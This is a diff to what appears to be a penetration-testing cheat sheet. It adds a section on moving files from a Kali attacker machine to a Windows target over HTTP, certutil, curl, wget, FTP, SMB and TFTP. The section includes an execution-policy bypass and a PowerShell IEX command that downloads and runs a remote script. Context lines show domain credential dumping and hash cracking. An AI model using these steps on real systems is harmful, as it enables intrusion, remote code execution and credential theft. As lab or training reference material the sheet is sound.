@@ -542,6 +542,152 @@ python3 secretsdump.py -ntds ./ntds.dit -system SYSTEM LOCAL -outputfile ./myhas
 hashcat -m 1000 myhashes.txt.ntds /home/kali/rockyou.txt -r /usr/share/hashcat/rules/dive.rule
 
 ```
+### File transfer
+```
+Section 2 – File Transfer (Windows and Kali Linux)
+
+Note! Make sure file location is in safe directory or in /var/www 
+Note! May need to run Set-ExecutionPolicy Unrestricted OR  powershell.exe -ExecutionPolicy Bypass
+
+#HTTP
+
+Kali Linux Machine
+Python -m SimpleHTTPServer 80
+
+Windows Powershell:
+$WebClient = New-Object System.Net.WebClient 
+$url = “http://Your_Kali_IP_Address/putty.exe” 
+$pathFile= “C:\Users\cyberlab\putty.exe” (file to your path)
+$WebClient.DownloadFile ($url, $pathFile)
+
+#HTTP 2
+Python -m SimpleHTTPServer 80
+
+ON Windows Browser type http://your_kali_linux_ip/file.exe
+
+#Using Invoke-Expression cmdlet (IEX)- no Admin Privilege
+
+Kali Linux Machine
+Create a script
+myScript.ps1 
+^^^^^^^^^^^^
+Ls
+Get-host
+
+Windows Powershell:
+
+$WebClient = New-Object System.Net.WebClient 
+$url = “http:// Your_Kali_IP_Address /myScript.ps1” 
+powershell.exe IEX ($WebClient.DownloadString ($url))
+
+#Certutil
+
+
+Kali Linux
+
+python -m SimpleHTTPServer 80
+
+
+Windows Machine
+
+certutil -urlcache -split -f http://192.168.57.6/putty.exe putty.exe 
+dir
+
+
+#Curl
+
+
+Kali Linux
+
+python -m SimpleHTTPServer 80
+
+
+Windows Machine
+
+curl http://192.168.57.6/putty.exe -o putty.exe 
+dir.
+
+
+#wget
+
+
+Kali Linux
+
+python -m SimpleHTTPServer 80
+
+Windows Machine
+
+wget http://192.168.57.6/putty.exe -OutFile putty.exe 
+OR
+powershell.exe wget http://192.168.57.6/putty.exe -OutFile putty.exe
+ 
+
+#FTP
+
+Kali Linux Machine
+
+Install 
+pip install pyftpdlib
+
+Start FTP Server
+ python3 -m pyftpdlib -p 21 -u <user_name -P <pass_word>
+
+Windows Powershell:
+
+ftp 192.168.57.6 
+get file.txt 
+dir
+
+
+Automate Transferring File using FTP commands
+
+echo open 192.168.53.102 > Auto_Xfile.txt
+echo USER >> Auto_Xfile.txt
+echo Kali >> Auto_Xfile.txt
+echo Kali >> Auto_Xfile.txt
+echo binary >> Auto_Xfile.txt
+echo GET file.exe >> Auto_Xfile.txt
+echo bye >> Auto_Xfile.txt
+
+
+
+#SMB
+NOTE! Make sure the port number for SMB is closed down -> 445 or 139
+NOTE! Make sure if you use pwd file is in current directory
+
+Kali Linux Machine
+
+impacket-smbserver share $(pwd) -smb2support # Start SMB server in the current directory 
+ OR 
+impacket-smbserver share /root/Downloads/test -smb2support 
+ OR 
+python3 smbserver.py share /root/test -smb2support
+
+Windows Powershell: Choose one of 3 options
+
+copy \\192.168.57.6\share\putty.exe 
+net use \\192.168. 57.6\share
+net use 
+copy \\192.168. 57.6\share\putty.exe 
+dir.
+
+
+#TFTP
+Note! May need to enable TFTP on windows machine!
+
+Kali Linux
+
+Open MetaSploit and use TFTP modules
+
+In MetaSploit
+Msf > Use auxiliary/server/tftp
+Msf auxiliary(tftp) > set TFTPROOT /root/shells TFTPROOT => /root/shells
+
+Windows Machine
+
+Tftp -I <ip_address> GET <file_name>
+dir
+```
 
 
 
